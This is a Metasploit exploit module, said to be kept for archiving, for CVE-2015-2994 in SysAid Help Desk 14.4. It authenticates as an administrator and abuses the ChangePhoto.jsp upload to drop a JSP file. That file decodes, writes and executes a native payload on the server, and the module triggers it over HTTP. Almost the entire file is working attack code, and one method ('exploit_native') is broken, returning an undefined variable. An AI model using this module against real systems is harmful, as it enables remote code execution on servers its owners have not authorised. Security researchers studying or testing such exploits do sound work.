##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

# NOTE !!!
# This exploit is kept here for archiving purposes only.
# Please refer to and use the version that has been accepted into the Metasploit framework.

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'SysAid Help Desk Administrator Portal Arbitrary File Upload',
      'Description' => %q{
        This module exploits a file upload vulnerability in SysAid Help Desk.
        The vulnerability exists in the ChangePhoto.jsp in the administrator portal,
        which does not handle correctly directory traversal sequences and does not
        enforce file extension restrictions. You need to have an administrator account,
        but there is a Metasploit auxiliary module that can create one for you.
        This module has been tested in SysAid v14.4 in both Linux and Windows.
      },
      'Author'       =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>'        # Vulnerability discovery and Metasploit module
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
          [ 'CVE', '2015-2994' ],
          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/generic/sysaid-14.4-multiple-vulns.txt' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2015/Jun/8' ]
        ],
      'DefaultOptions' => { 'WfsDelay' => 5 },
      'Privileged'  => false,
      'Platform'    => %w{ linux win },
      'Targets'     =>
        [
          [ 'Automatic', { } ],
          [ 'SysAid Help Desk v14.4 / Linux',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_X86
            }
          ],
          [ 'SysAid Help Desk v14.4 / Windows',
            {
              'Platform' => 'win',
              'Arch' => ARCH_X86
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jun 3 2015'))

    register_options(
      [
        OptPort.new('RPORT', [true, 'The target port', 8080]),
        OptString.new('TARGETURI', [ true,  "SysAid path", '/sysaid']),
        OptString.new('USERNAME', [true, 'The username to login as']),
        OptString.new('PASSWORD', [true, 'Password for the specified username']),
      ], self.class)
  end


  def check
    res = send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], 'errorInSignUp.htm'),
      'method' => 'GET'
    })
    if res && res.code == 200 && res.body.to_s =~ /css\/master\.css\?v([0-9]{1,2})\.([0-9]{1,2})/
      major = $1.to_i
      minor = $2.to_i
      if major == 14 && minor == 4
        return Exploit::CheckCode::Appears
      elsif major > 14
        return Exploit::CheckCode::Safe
      end
    end
    # Haven't tested in versions < 14.4, so we don't know if they are vulnerable or not
    return Exploit::CheckCode::Unknown
  end


  def authenticate
    res = send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], 'Login.jsp'),
      'method' => 'POST',
      'vars_post' => {
        'userName' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }
    })
    if res && res.code == 302 && res.get_cookies
      return res.get_cookies
    else
      return nil
    end
  end


  def upload_payload(payload, is_exploit)
    post_data = Rex::MIME::Message.new
    post_data.add_part(payload,
      "application/octet-stream", 'binary',
      "form-data; name=\"#{Rex::Text.rand_text_alpha(4+rand(8))}\"; filename=\"#{Rex::Text.rand_text_alpha(4+rand(10))}.jsp\"")

    data = post_data.to_s

    if is_exploit
      print_status("#{peer} - Uploading payload...")
    end
    res = send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], 'ChangePhoto.jsp'),
      'method' => 'POST',
      'cookie' => @cookie,
      'data'   => data,
      'ctype'  => "multipart/form-data; boundary=#{post_data.bound}",
      'vars_get' => { 'isUpload' => 'true' }
    })

    if res && res.code == 200 && res.body.to_s =~ /parent.glSelectedImageUrl = \"(.*)\"/
      if is_exploit
        print_status("#{peer} - Payload uploaded successfully")
      end
      return $1
    else
      return nil
    end
  end


  def pick_target
    return target if target.name != 'Automatic'

    print_status("#{peer} - Determining target")
    os_finder_payload = %Q{<html><body><%out.println(System.getProperty("os.name"));%></body><html>}
    url = upload_payload(os_finder_payload, false)

    res = send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], url),
      'method' => 'GET',
      'cookie' => @cookie,
      'headers' => { 'Referer' => Rex::Text.rand_text_alpha(10 + rand(10)) }
    })

    if res && res.code == 200
      if res.body.to_s =~ /Linux/
        register_files_for_cleanup('webapps/' + url)
        return targets[1]
      elsif res.body.to_s =~ /Windows/
        register_files_for_cleanup('root/' + url)
        return targets[2]
      end
    end

    return nil
  end


  def generate_jsp_payload
    opts = {:arch => @my_target.arch, :platform => @my_target.platform}
    payload = exploit_regenerate_payload(@my_target.platform, @my_target.arch)
    exe = generate_payload_exe(opts)
    base64_exe = Rex::Text.encode_base64(exe)

    native_payload_name = rand_text_alpha(rand(6)+3)
    ext = (@my_target['Platform'] == 'win') ? '.exe' : '.bin'

    var_raw     = rand_text_alpha(rand(8) + 3)
    var_ostream = rand_text_alpha(rand(8) + 3)
    var_buf     = rand_text_alpha(rand(8) + 3)
    var_decoder = rand_text_alpha(rand(8) + 3)
    var_tmp     = rand_text_alpha(rand(8) + 3)
    var_path    = rand_text_alpha(rand(8) + 3)
    var_proc2   = rand_text_alpha(rand(8) + 3)

    if @my_target['Platform'] == 'linux'
      var_proc1 = Rex::Text.rand_text_alpha(rand(8) + 3)
      chmod = %Q|
      Process #{var_proc1} = Runtime.getRuntime().exec("chmod 777 " + #{var_path});
      Thread.sleep(200);
      |

      var_proc3 = Rex::Text.rand_text_alpha(rand(8) + 3)
      cleanup = %Q|
      Thread.sleep(200);
      Process #{var_proc3} = Runtime.getRuntime().exec("rm " + #{var_path});
      |
    else
      chmod = ''
      cleanup = ''
    end

    jsp = %Q|
    <%@page import="java.io.*"%>
    <%@page import="sun.misc.BASE64Decoder"%>
    <%
    try {
      String #{var_buf} = "#{base64_exe}";
      BASE64Decoder #{var_decoder} = new BASE64Decoder();
      byte[] #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());

      File #{var_tmp} = File.createTempFile("#{native_payload_name}", "#{ext}");
      String #{var_path} = #{var_tmp}.getAbsolutePath();

      BufferedOutputStream #{var_ostream} =
        new BufferedOutputStream(new FileOutputStream(#{var_path}));
      #{var_ostream}.write(#{var_raw});
      #{var_ostream}.close();
      #{chmod}
      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});
      #{cleanup}
    } catch (Exception e) {
    }
    %>
    |

    jsp = jsp.gsub(/\n/, '')
    jsp = jsp.gsub(/\t/, '')
    jsp = jsp.gsub(/\x0d\x0a/, "")
    jsp = jsp.gsub(/\x0a/, "")

    return jsp
  end


  def exploit_native


    return jsp_name
  end


  def exploit
    @cookie = authenticate
    if not @cookie
      print_error("#{peer} - Unable to authenticate with the provided credentials.")
      return
    else
      print_status("#{peer} - Authentication was successful with the provided credentials.")
    end

    @my_target = pick_target
    if @my_target.nil?
      print_error("#{peer} - Unable to select a target, we must bail.")
      return
    else
      print_status("#{peer} - Selected target #{@my_target.name}")
    end

    # When using auto targeting, MSF selects the Windows meterpreter as the default payload.
    # Fail if this is the case and ask the user to select an appropriate payload.
    if @my_target['Platform'] == 'linux' && payload_instance.name =~ /Windows/
      fail_with(Failure::BadConfig, "#{peer} - Select a compatible payload for this Linux target.")
    end

    jsp_payload = generate_jsp_payload
    jsp_path = upload_payload(jsp_payload, true)
    if not jsp_path
      fail_with(Failure::Unknown, "#{peer} - Payload upload failed")
    end

    if @my_target == targets[1]
      register_files_for_cleanup('webapps/' + jsp_path)
    else
      register_files_for_cleanup('root/' + jsp_path)
    end

    print_status("#{peer} - Executing payload...")
    send_request_cgi({
      'uri'    => normalize_uri(datastore['TARGETURI'], jsp_path),
      'method' => 'GET',
      'cookie' => @cookie,
      'headers' => { 'Referer' => Rex::Text.rand_text_alpha(10 + rand(10)) }
    })
  end
end
